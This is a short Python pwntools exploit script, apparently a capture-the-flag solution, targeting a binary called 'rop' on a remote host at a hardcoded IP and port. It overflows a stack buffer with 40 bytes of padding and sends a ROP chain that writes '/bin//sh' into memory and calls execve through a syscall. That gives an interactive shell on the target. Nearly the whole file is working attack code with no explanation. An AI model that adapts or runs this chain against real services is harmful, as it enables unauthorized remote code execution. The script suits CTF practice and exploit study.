#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = False

c = 0
pwn_file = "./rop"
elf = ELF(pwn_file)
if debug:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 2113)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    b *0x400a25
    c
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'


# ROPgadget --binary rop --ropchain
from struct import pack
# Padding goes here
p = b''
p += pack('<Q', 0x0000000000401617) # pop rsi ; ret
p += pack('<Q', 0x00000000006ca080) # @ .data
p += pack('<Q', 0x000000000044f6cc) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x00000000004741d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401617) # pop rsi ; ret
p += pack('<Q', 0x00000000006ca088) # @ .data + 8
p += pack('<Q', 0x00000000004261ff) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004741d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004014f6) # pop rdi ; ret
p += pack('<Q', 0x00000000006ca080) # @ .data
p += pack('<Q', 0x0000000000401617) # pop rsi ; ret
p += pack('<Q', 0x00000000006ca088) # @ .data + 8
p += pack('<Q', 0x00000000004429f6) # pop rdx ; ret
p += pack('<Q', 0x00000000006ca088) # @ .data + 8
p += pack('<Q', 0x00000000004261ff) # xor rax, rax ; ret
# rax + 59 = rax + 0x3b
p += p64(0x000000000044f6cc) # pop rax ; ret
p += p64(59)
p += pack('<Q', 0x00000000004003da) # syscall
c.send(b'\0' * (32 + 8) + p)

c.interactive()
c.close()
